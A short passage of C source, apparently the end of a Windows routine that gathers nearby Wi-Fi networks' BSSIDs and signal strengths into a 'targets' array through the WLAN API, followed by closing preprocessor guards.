                           sizeof(targets[count].bssid));
        targets[count].rssi = b->lRssi;
        targets[count].suffix[0] = suffix[0];
        targets[count].suffix[1] = suffix[1];
        count++;
    }

    WlanFreeMemory(bl);
    return count;
}

#if defined(__GNUC__) || defined(__clang__)
#pragma GCC diagnostic pop
#endif

#endif /* _INC_WLANAPI && !LANTERN_WLAN_IMPL_DEFINED */
